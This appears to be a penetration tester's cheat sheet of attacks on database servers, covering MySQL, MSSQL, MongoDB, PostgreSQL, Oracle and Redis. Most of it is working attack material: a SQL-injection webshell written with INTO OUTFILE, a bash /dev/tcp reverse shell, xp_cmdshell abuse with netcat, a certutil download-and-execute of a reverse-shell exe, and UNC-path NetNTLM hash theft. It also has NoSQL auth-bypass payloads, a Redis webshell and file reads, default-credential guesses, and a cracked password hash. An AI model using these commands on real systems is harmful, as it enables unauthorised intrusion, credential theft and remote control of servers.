## MySQL
```
$ mysql -h 192.168.155.x -P 3306 -u root -root
$ mysql -h 192.168.137.x -P 3306 -u mute -p

# Commands
sql> show databases;
sql> use {DATABASE};
sql> show tables;
sql> describe {TABLE};
sql> show columns from {TABLE};

sql> select version();
sql> select @@version(); 
sql> select user(); 
sql> select database();

#Get a shell with the mysql client user
\! sh

\! clear  ←  clear screen

Testing validity of found mysql credentials
$ mysql -username -password -e 'show databases;'


MYSQL Credentials? Root Unauthorized Access?
mysql -uroot -p
Enter Password:
root : root
root : toor
root :


Although the various MySQL database variants don't offer a single function to escalate to RCE like xp_cmdshell, we can abuse the SELECT INTO_OUTFILE statement to write files on the web server.
For this attack to work, the file location must be writable to the OS user running the database software.

Write a WebShell To Disk via INTO OUTFILE directive
As an example, let's resume the UNION payload on our MySQL target application, expanding the query that writes a webshell on disk.
We'll issue the UNION SELECT SQL keywords to include a single PHP line into the first column and save it as webshell.php in a writable web folder.

' UNION SELECT "<?php system($_GET['cmd']);?>", null, null, null, null INTO OUTFILE "/var/www/html/tmp/webshell.php" -- //

The written PHP code file results in the following:
<? system($_REQUEST['cmd']); ?>
   
The PHP system function will parse any statement included in the cmd parameter coming from the client HTTP REQUEST, thus acting like a web-interactive command shell.
To confirm, we can access the newly created webshell inside the tmp folder along with the id command.

192.168.191.x/tmp/webshell.php?cmd=ls

We are executing commands as the www-data user, an identity commonly associated with web servers on Linux systems.    


$ mysql -h 192.168.137.145 -P 3306 -u mute -p
Enter password: C78maEQUI

MariaDB Example
MariaDB [(none)]> SELECT user();
+------------------------+
| user()                 |
+------------------------+
| mute@192.168.49.x |
+------------------------+

MariaDB [(none)]> show databases;
+--------------------+
| Database           |
+--------------------+
| information_schema |
| mute            |
+--------------------+
2 rows in set (0.073 sec)

MariaDB [mute]> select * from users_secure;
+----+----------+--------------------------------------------------------------+--------------------------------+---------------------+-------------------+---------------+-------------------+---------------+
| id | username | password                                                     | salt                           | last_update         | password_history1 | salt_history1 | password_history2 | salt_history2 |
+----+----------+--------------------------------------------------------------+--------------------------------+---------------------+-------------------+---------------+-------------------+---------------+
|  1 | admin    | $2a$05$bJcIfCBjN5Fuh0K9qfoe0eRJqMdM49sWvuSGqv84VMMAkLgkK8Xn | $2a$05$bJcIfCBjN5Fuh0K9qfoe0n$ | 2021-05-17 10:56:27 | NULL              | NULL          | NULL              | NULL          |
+----+----------+--------------------------------------------------------------+--------------------------------+---------------------+-------------------+---------------+-------------------+---------------+
1 row in set (0.072 sec)

$ hashcat -m 3200 hash /usr/share/wordlists/rockyou.txt --show
$2a$05$bJcIfCBjN5Fuh0K9qfoe0eRJqMdM49sWvuSGqv84VMMAkLgkK8XnC:thedoctor
```

## MySQL Reference
```
MySQL (Port 3306)
nmap
nmap -sV -Pn -vv --script=mysql-audit,mysql-databases,mysql-dump-hashes,mysql-empty-password,mysql-enum,mysql-info,mysql-query,mysql-users,mysql-variables,mysql-vuln-cve2012-2122 $ip -p 3306
nmap -sV -Pn -vv -script=mysql* $ip -p 3306

Local Access
If you gain access to target box and see mysql running, you can try to connect with it from target locally:
mysql -u root 
# Connect to root without password

mysql -u root -p 
# A password will be asked

# Always test root:root credential

Remote Access
mysql -h <Hostname> -u root
mysql -h <Hostname> -u root@localhost

If running as root:
If Mysql is running as root and you have acces, you can run commands:
mysql> select do_system('id');
mysql> \! sh

Getting all the information from inside the database
mysqldump -u admin -p admin --all-databases --skip-lock-tables 

Post Enumeration
Here are list of some files to check after shell on target system to get some credentials or some juicy information that help to get root easily 

MySQL server configuration files:

Unix
my.cnf
/etc/mysql
/etc/my.cnf
/etc/mysql/my.cnf
/var/lib/mysql/my.cnf
~/.my.cnf
/etc/my.cnf

Windows
config.ini
my.ini
windows\my.ini
winnt\my.ini
<InstDir>/mysql/data/

Command History
~/.mysql.history

Log Files
connections.log
update.log
common.log

Finding passwords to MySQL
You might gain access to a shell by uploading a reverse-shell. And then you need to escalate your privilege.
Look into the database and see what users and passwords that are available.
/var/www/html/configuration.php

# To connect to a database
mysql -h localhost -u root -p

# To backup all databases
mysqldump --all-databases --all-routines -u root -p > ~/fulldump.sql

# To restore all databases
mysql -u root -p  < ~/fulldump.sql

# To create a database in utf8 charset
CREATE DATABASE owa CHARACTER SET utf8 COLLATE utf8_general_ci;

# Types of user permissions:

# ALL PRIVILEGES - gives user full unrestricted access 
# CREATE - allows user to create new tables or databases
# DROP - allows user to delete tables or databases
# DELETE - allows user to delete rows from tables
# INSERT- allows user to insert rows into tables
# SELECT- allows user to use the Select command to read through databases
# UPDATE- allow user to update table rows
# GRANT OPTION- allows user to grant or remove other users' privileges

# To grant specific permissions to a particular user
GRANT permission_type ON database_name.table_name TO 'username'@'hostname';

# To add a user and give rights on the given database
GRANT ALL PRIVILEGES ON database.* TO 'user'@'localhost'IDENTIFIED BY 'password' WITH GRANT OPTION;

# To change the root password
SET PASSWORD FOR root@localhost=PASSWORD('new_password');

# To delete a database
DROP DATABASE database_name;

# To reload privileges from MySQL grant table
FLUSH PRIVILEGES;

# Show permissions for a particular user
SHOW GRANTS FOR 'username'@'hostname';

# Find out who the current user is
SELECT CURRENT_USER();

# To delete a table in the database
DROP TABLE table_name;

#To return all records from a particular table
SELECT * FROM table_name;

# To create a table (Users table used as example)
# Note: Since username is a primary key, it is NOT NULL by default. Email is optional in this example.
CREATE TABLE Users (
	username VARCHAR(80),
	password VARCHAR(80) NOT NULL,
	email VARCHAR(80),
	PRIMARY KEY (username)
);

# To disable general logging 
set global general_log=0;

MySQL
mysql -u root -p
mysql -u <USERNAME> -h <RHOST> -p

mysql> show databases;
mysql> use <DATABASE>;
mysql> show tables;
mysql> describe <TABLE>;
mysql> SELECT * FROM Users;
mysql> SELECT * FROM users \G;
mysql> SELECT Username,Password FROM Users;

Update User Password
mysql> update user set password = '37b08599d3f323491a66feabbb5b26af' where user_id = 1;

Drop a Shell
mysql> \! /bin/sh

Insert Code to get executed
mysql> insert into users (id, email) values (<LPORT>, "- E $(bash -c 'bash -i >& /dev/tcp/<LHOST>/<LPORT> 0>&1')");

Write SSH Key into authorized_keys2 file
mysql> SELECT "<KEY>" INTO OUTFILE '/root/.ssh/authorized_keys2' FIELDS TERMINATED BY '' OPTIONALLY ENCLOSED BY '' LINES TERMINATED BY '\n';
```

## MSSQL
```
Connect to the DB:
sqsh -S 192.168.0.x -U username -P password
mssqlclient.py user:password@192.168.0.x -db mydb -port 27900
impacket-mssqlclient -windows-auth 'domain/web_svc@10.10.80.x'        

XP_cmdshell
Enabling xp_cmdshell feature
SQL> EXECUTE sp_configure 'show advanced options', 1;
[*] INFO(SQL01\SQLEXPRESS): Line 185: Configuration option 'show advanced options' changed from 0 to 1. Run the RECONFIGURE statement to install.
SQL> RECONFIGURE;
SQL> EXECUTE sp_configure 'xp_cmdshell', 1;
[*] INFO(SQL01\SQLEXPRESS): Line 185: Configuration option 'xp_cmdshell' changed from 0 to 1. Run the RECONFIGURE statement to install.
SQL> RECONFIGURE;

One Liner:
EXECUTE sp_configure 'show advanced options', 1;RECONFIGURE;EXECUTE sp_configure 'xp_cmdshell', 1;RECONFIGURE;

Since we have full control over the system, we can now easily upgrade our SQL shell to a more standard reverse shell.

Get a reverse shell:
xp_cmdshell C:\windows\tasks\nc.exe 192.168.45.x 8888 -e cmd
' EXEC xp_cmdshell 'certutil -urlcache -f http://192.168.45.208/80.exe C:\Users\Public\80.exe'-- <-- Download an exe revshell. 
' EXEC xp_cmdshell 'powershell C:\Users\Public\80.exe'-- <-- Execute your revshell with powershell.

base64
powershell encoded base64 reverse shell
SQL> xp_cmdshell powershell -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAY

netcat
xp_cmdshell C:\windows\tasks\nc.exe 192.168.45.x 8888 -e cmd

Search for registry passwords from mssql
We search the registry hoping to find any plaintext passwords.
reg query HKLM /f pass /t REG_SZ /s

Nmap
nmap scripts
nmap -n -v -sV -Pn -p 1433 –script ms-sql-info,ms-sql-ntlm-info,ms-sql-empty-password $ip

Bruteforce
nmap -n -v -sV -Pn -p 1433 –script ms-sql-brute –script-args userdb=users.txt,passdb=passwords.txt $ip

MSSQL Server + Responder
UNC Path Injection
Uniform Naming Convention allows the sharing of resources on a network via a very precise syntax: \IP-Server\shareName\Folder\File
launch responder : responder -I eth0
EXEC master..xp_dirtree \"\\\\192.168.1.x\\\\evil\";
1'; use master; exec xp_dirtree '\\10.10.15.XX\SHARE';--

[+] Attacking MSSQL with Metasploit
[>] Enumerate MSSQL Servers on the network:
msf > use auxiliary/scanner/mssql/mssql_ping
nmap -sU --script=ms-sql-info 192.168.1.108 192.168.1.156

[>] Bruteforce MSSQL Database:
msf auxiliary(mssql_login) > use auxiliary/scanner/mssql/mssql_login

[>] Enumerate MSSQL Database:
msf > use auxiliary/admin/mssql/mssql_enum

[>] Gain shell using gathered credentials
msf > use exploit/windows/mssql/mssql_payload
msf exploit(mssql_payload) > set PAYLOAD windows/meterpreter/reverse_tcp

Steal NetNTLM Hash /Relay Attack
SQL> exec master.dbo.xp_dirtree '\\<LHOST>\FOOBAR'
```

## NoSQL (MongoDB, CouchDB)
```
bash
# Tools
# https://github.com/codingo/NoSQLMap
python NoSQLMap.py
# https://github.com/torque59/Nosql-Exploitation-Framework
python nosqlframework.py -h
# https://github.com/Charlie-belmer/nosqli
nosqli scan -t http://localhost:4000/user/lookup?username=test
# https://github.com/FSecureLABS/N1QLMap
./n1qlMap.py http://localhost:3000 --request example_request_1.txt --keyword beer-sample --extract travel-sample

# Payload: 
' || 'a'=='a

mongodbserver:port/status?text=1

# in URL
username[$ne]=toto&password[$ne]=toto

##in JSON
{"username": {"$ne": null}, "password": {"$ne": null}}
{"username": {"$gt":""}, "password": {"$gt":""}}

- Trigger MongoDB syntax error -> ' " \ ; { }
- Insert logic -> ' || '1' == '1' ; //
- Comment out -> //
- Operators -> $where $gt $lt $ne $regex
- Mongo commands -> db.getCollectionNames()
```

## PostGreSQL
```
PostgreSQL
$ psql
$ psql -h <RHOST> -p 5432 -U <USERNAME> -d <DATABASE>

common commands
postgres=# \c
postgres=# \list
postgres=# \c  <DATABASE>
<DATABASE>=# \dt
<DATABASE>=# \du
<DATABASE>=# TABLE <TABLE>;
<DATABASE>=# SELECT * FROM users;
<DATABASE>=# \q

$ psql -h 192.168.174.56 -p 5432 -U postgres

Look for local listening active ports, if you see postgress you can chisel it
$ psql -h 127.0.0.1 -U postgres -W

Port 5437 is running postgresql version between 11.3 - 11.7. I was able to login with the default credentials of 
postgres:postgres using psql.

 psql -h 192.168.51.47 -U postgres -p 5437
 
 As we are running on a version of postgresql higher than 9.3 we should be able to use the following exploit to gain command execution on the target machine.
 https://www.exploit-db.com/exploits/46813
```

## Oracle
```
Oracle
Install oscanner:
apt-get install oscanner  

Run oscanner:
oscanner -s 192.168.1.200 -P 1521 

Fingerprint Oracle TNS Version:
Install tnscmd10g:
apt-get install tnscmd10g

Fingerprint oracle tns:
tnscmd10g version -h TARGET
nmap --script=oracle-tns-version 

Brute force oracle user accounts:
Identify default Oracle accounts:
 nmap --script=oracle-sid-brute 
 nmap --script=oracle-brute 

Run nmap scripts against Oracle TNS:
nmap -p 1521 -A TARGET
```

## Redis
```
Redis
Redis is an open source, in-memory data structure store, used as a database, cache and message broker.
If redis is open and we have its credential we can login from cli

    redis-cli -h $ip -a 'password'

-NOAUTH command to check if authorization is required or not

    keys * (this command list the dbcontents)

    lrange db_keyname 1 100 (if type command doesnt display the contents )

    Enumerating files
    eval dofile("/etc/passwd") 0
    eval "dofile('c:\\users\\path')" 0

    dumping redid db file
    eval dofile('/var/data/app/db.conf');return(db.password); 0

Getting rce through redis
we can get webshell through redis if we have write access to a directory whithin web root or accessible by some other means

    nc -nv $ip port

10.85.0.52:6379> config set dir /usr/share/nginx/html OK 10.85.0.52:6379> config set dbfilename redis.php OK 10.85.0.52:6379> set test "" # Our code goes here OK 10.85.0.52:6379> save OK

Or the eval dofile allows us to read system sensitive files via redis

redis-cli -h 10.10.188.12 -p 6379 eval "dofile('C:\\Users\\enterprise-security\\Desktop\\user.txt')" 0

we can also use netcat to connect to redis

    nc $ip port
```
